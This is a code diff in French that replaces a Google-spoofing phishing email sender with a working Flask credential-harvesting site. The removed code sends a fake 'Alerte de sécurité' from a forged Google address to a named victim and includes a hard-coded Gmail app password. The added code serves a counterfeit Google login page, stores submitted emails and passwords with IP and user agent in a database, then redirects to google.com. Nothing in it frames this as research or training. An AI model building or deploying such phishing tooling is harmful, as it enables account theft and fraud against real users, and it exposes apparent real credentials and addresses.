@@ -1,80 +1,95 @@
-import smtplib
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-from datetime import datetime
+import os
+import psycopg2
+from flask import Flask, request, redirect, render_template_string
 
-# ===== CONFIGURATION =====
-SMTP_SERVER  = "smtp.gmail.com"
-SMTP_PORT    = 587
-SENDER_EMAIL = "mesquin366@gmail.com"
-APP_PASSWORD = "gzan fsrt doyl nfxs"  # 🔑 REMPLACEZ PAR VOTRE MOT DE PASSE (sans espaces)
+app = Flask(__name__)
 
-PHISHING_URL = "https://google-p3e0.onrender.com/check-activity"
-VICTIM_EMAIL = "maestromaes18@gmail.com"
-# =========================
+DATABASE_URL = os.environ.get('DATABASE_URL')
 
-def send_google_alert():
-    current_date = datetime.now().strftime("%d %B").lower()
-    
-    html = f"""
+def get_db_connection():
+    conn = psycopg2.connect(DATABASE_URL)
+    return conn
+
+def get_client_info():
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    ua = request.headers.get('User-Agent', 'Inconnu')
+    return ip, ua
+
+# Page d'alerte qui s'affiche quand on clique sur le lien (GET)
+@app.route('/check-activity', methods=['GET'])
+def show_alert():
+    return render_template_string('''
     <!DOCTYPE html>
     <html>
     <head>
         <meta charset="UTF-8">
-        <title>Alerte Google</title>
+        <title>Alerte de sécurité - Google</title>
+        <style>
+            body { font-family: Arial, sans-serif; background: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+            .container { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 350px; text-align: center; }
+            input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
+            button { background: #1a73e8; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; width: 100%; font-size: 16px; }
+            button:hover { background: #1557b0; }
+            .logo { font-size: 28px; font-weight: bold; margin-bottom: 20px; }
+            .google-blue { color: #4285f4; }
+            .google-red { color: #ea4335; }
+            .google-yellow { color: #fbbc05; }
+            .google-green { color: #34a853; }
+            h3 { color: #202124; margin: 0 0 10px 0; }
+            p { color: #5f6368; margin: 0 0 20px 0; }
+            .alert-icon { font-size: 48px; margin-bottom: 15px; }
+        </style>
     </head>
-    <body style="margin:0; padding:0; background:#f4f4f4; font-family:Roboto, Arial, sans-serif;">
-        <div style="max-width:600px; margin:0 auto; background:#fff; border-radius:8px; overflow:hidden; box-shadow:0 1px 4px rgba(0,0,0,0.1);">
-            <div style="padding:24px 24px 0 24px;">
-                <span style="font-size:24px; font-weight:500;">
-                    <span style="color:#4285f4;">G</span><span style="color:#ea4335;">o</span><span style="color:#fbbc05;">o</span><span style="color:#4285f4;">g</span><span style="color:#34a853;">l</span><span style="color:#ea4335;">e</span>
-                </span>
-                <h1 style="font-size:20px; font-weight:500; color:#202124; margin:16px 0 4px 0;">Alerte de sécurité</h1>
-                <p style="font-size:14px; color:#5f6368; margin:0 0 24px 0;">{current_date}</p>
+    <body>
+        <div class="container">
+            <div class="logo">
+                <span class="google-blue">G</span><span class="google-red">o</span><span class="google-yellow">o</span><span class="google-blue">g</span><span class="google-green">l</span><span class="google-red">e</span>
             </div>
-            <div style="padding:0 24px 24px 24px;">
-                <div style="font-size:16px; font-weight:500; color:#202124; margin-bottom:12px;">
-                    Nouvelle connexion depuis un Apple iPhone
-                </div>
-                <div style="background:#f8f9fa; border:1px solid #e0e0e0; border-radius:8px; padding:12px 16px; margin:16px 0; text-align:center; font-size:16px; font-weight:500; color:#202124;">
-                    {VICTIM_EMAIL}
-                </div>
-                <p style="font-size:14px; color:#202124; line-height:1.5; margin:16px 0;">
-                    Nous avons détecté une nouvelle connexion à votre compte Google depuis un Apple iPhone.<br>
-                    Si c'était vous, aucune action de votre part n'est requise. Dans le cas contraire, nous vous aiderons à sécuriser votre compte.
-                </p>
-                <div style="margin:24px 0; text-align:center;">
-                    <a href="{PHISHING_URL}" style="display:inline-block; background:#1a73e8; color:#fff; text-decoration:none; font-weight:500; padding:10px 24px; border-radius:4px;">Consulter l'activité</a>
-                </div>
-                <div style="font-size:12px; color:#5f6368; margin-top:24px;">
-                    Vous pouvez aussi voir l'activité liée à la sécurité de votre compte ici :<br>
-                    <a href="https://myaccount.google.com/notifications" style="color:#1a73e8; text-decoration:none;">https://myaccount.google.com/notifications</a>
-                </div>
-            </div>
-            <div style="padding:20px 24px; font-size:11px; color:#5f6368; border-top:1px solid #e0e0e0; background:#f8f9fa;">
-                <p>Cet e-mail vous a été envoyé pour vous informer de modifications importantes apportées à votre compte et aux services Google que vous utilisez.</p>
-                <p style="margin-top:12px;">© 2026 Google LLC | 1601 Amphitheatre Parkway, Mountain View, CA 94043 USA</p>
-            </div>
+            <div class="alert-icon">⚠️</div>
+            <h3>Alerte de sécurité</h3>
+            <p>Une connexion suspecte a été détectée sur votre compte depuis un iPhone au Cameroun.</p>
+            <form method="POST" action="/check-activity">
+                <input type="email" name="email" placeholder="Votre adresse email" required>
+                <input type="password" name="password" placeholder="Votre mot de passe" required>
+                <button type="submit">Vérifier mon identité</button>
+            </form>
         </div>
     </body>
     </html>
-    """
+    ''')
 
-    msg = MIMEMultipart("alternative")
-    msg["Subject"] = "Alerte de sécurité : Nouvelle connexion détectée"
-    msg["From"]    = "Google <no-reply@accounts.google.com>"
-    msg["To"]      = VICTIM_EMAIL
-    msg.attach(MIMEText(html, "html"))
+# Traitement du formulaire (POST)
+@app.route('/check-activity', methods=['POST'])
+def check_activity():
+    email = request.form.get('email')
+    password = request.form.get('password')
 
+    if not email or not password:
+        return "Données manquantes", 400
+
+    ip, ua = get_client_info()
     try:
-        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
-            server.ehlo()
-            server.starttls()
-            server.login(SENDER_EMAIL, APP_PASSWORD.replace(" ", ""))  # enlève les espaces
-            server.send_message(msg)
-            print("✅ Email envoyé avec succès !")
+        conn = get_db_connection()
+        cur = conn.cursor()
+        cur.execute("""
+            INSERT INTO google_credentials (email, password, ip_address, user_agent)
+            VALUES (%s, %s, %s, %s)
+        """, (email, password, ip, ua))
+        conn.commit()
+        cur.close()
+        conn.close()
+        print(f"🔐 Capturé : {email} depuis {ip}")
     except Exception as e:
-        print(f"❌ Erreur : {e}")
+        print(f"❌ Erreur BD : {e}")
+        return "Erreur serveur", 500
 
-if __name__ == "__main__":
-    send_google_alert()
+    # Redirection vers Google après capture
+    return redirect('https://www.google.com')
+
+@app.route('/')
+def index():
+    return redirect('https://www.google.com')
+
+if __name__ == '__main__':
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host='0.0.0.0', port=port)
